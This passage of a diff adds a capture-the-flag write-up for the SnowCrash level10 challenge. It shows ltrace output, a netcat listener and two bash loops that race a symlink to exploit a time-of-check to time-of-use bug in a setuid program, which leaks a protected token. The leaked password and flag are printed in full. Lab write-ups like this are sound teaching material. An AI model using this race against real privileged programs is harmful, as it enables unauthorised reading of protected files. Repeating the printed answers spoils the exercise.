@@ -925,4 +925,133 @@ Password:
 level10@SnowCrash:~$ 
 ```
 
+</details>
+
+## level10
+
 <details>
+
+<summary>Explanations</summary>
+
+###
+
+This time again, we have 2 files:
+- A progam named ``level10``
+- A file named ``token``
+
+We don't have any permission on ``token`` and when executing ``level10``, this happens:
+```bash
+level10@SnowCrash:~$ ./level10 
+./level10 file host
+	sends file to host if you have access to it
+```
+
+The program asks us to send a file, and give a host. We have our file ``token``, but we have no permission on it. And we don't have a host. We could create it, but we don't know on which port the program is trying to connect to. So let's use a valid file, and a random host to check what the program does:
+```bash
+level10@SnowCrash:~$ ltrace ./level10 /tmp/test 0
+__libc_start_main(0x80486d4, 3, 0xbffff7e4, 0x8048970, 0x80489e0 <unfinished ...>
+access("/tmp/test", 4)                                      = 0
+printf("Connecting to %s:6969 .. ", "0")                    = 24
+fflush(0xb7fd1a20Connecting to 0:6969 .. )                                          = 0
+socket(2, 1, 0)                                             = 3
+inet_addr("0")                                              = NULL
+htons(6969, 1, 0, 0, 0)                                     = 14619
+connect(3, 0xbffff72c, 16, 0, 0)                            = -1
+printf("Unable to connect to host %s\n", "0"Unable to connect to host 0
+)               = 28
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+```
+
+After doing so, we learn that the program connects to port ``6969``. So let's create our host and try to see what happens with a valid file:
+```bash
+level10@SnowCrash:~$ nc -lk 6969
+
+# In another terminal:
+level10@SnowCrash:~$ ./level10 /tmp/test 0
+Connecting to 0:6969 .. Connected!
+Sending file .. wrote file!
+######################
+
+.*( )*.
+test
+```
+
+The program sends ``.*( )*.`` to the host and then ``test``, which is the content of our file ``/tmp/test``. So this is how we are going to get the content of ``token``. But we have no permission on it. And this is where the program is important. First, let's take a look at what the program does when it works:
+```bash
+access("/tmp/test", 4)                                      = 0
+printf("Connecting to %s:6969 .. ", "0")                    = 24
+fflush(0xb7fd1a20Connecting to 0:6969 .. )                                          = 0
+socket(2, 1, 0)                                             = 3
+inet_addr("0")                                              = NULL
+htons(6969, 1, 0, 0, 0)                                     = 14619
+connect(3, 0xbffff72c, 16, 0, 0)                            = 0
+write(3, ".*( )*.\n", 8)                                    = 8
+printf("Connected!\nSending file .. "Connected!
+)                      = 27
+fflush(0xb7fd1a20Sending file .. )                                          = 0
+open("/tmp/test", 0, 010)                                   = 4
+read(4, "test\n", 4096)                                     = 5
+write(3, "test\n", 5)                                       = 5
+puts("wrote file!"wrote file!
+)                                         = 12
++++ exited (status 12) +++
+```
+
+### Authentication
+
+It checks the access to the file, and then open it if we are able to connect. There is actually a well-known bug with that, called ``time-of-check to time-of-use`` (TOCTOU). This consists in changing the link of the file **BETWEEN** the _check_, and the _use_. To do so, we need to use a **symlink**. We need to pass the symlink of a valid file to the program and be fast enough to change the symlink of the valid file to our ``token`` file. But as basic humans, we can't be THAT fast, so we need to use infinite loops:
+- One loop that is going swap our link between a valid file, and the ``token`` file:
+```bash
+#!/bin/bash
+touch /tmp/fakefile
+while true; do
+        ln -sf /tmp/fakefile /tmp/link
+        ln -sf ~/token /tmp/link
+done
+```
+
+- Another loop that is going to execute the program with the symlink as an arg:
+```bash
+#!/bin/bash
+while true; do
+	~/./level10 /tmp/link 0
+done
+```
+
+Now, let's execute both scripts and see what happens in the host:
+```bash
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+```
+
+### Retrieving the token
+
+We get either empty answer (which is normal since our fakelink file is empty), either ``woupa2yuojeeaaed06riuj63c``.
+
+The only different string that can show, is our ``token`` file content. But as the previous levels, there is no getflag message. So let's try to log in the ``flag10`` user first:
+```bash
+level10@SnowCrash:~$ su flag10
+Password: 
+Don't forget to launch getflag !
+```
+
+It is indeed the password of the ``flag10`` user, let's get the token now and move onto the next level:
+```bash
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+flag10@SnowCrash:~$ su level11
+Password: 
+level11@SnowCrash:~$ 
+```
+
+</details>
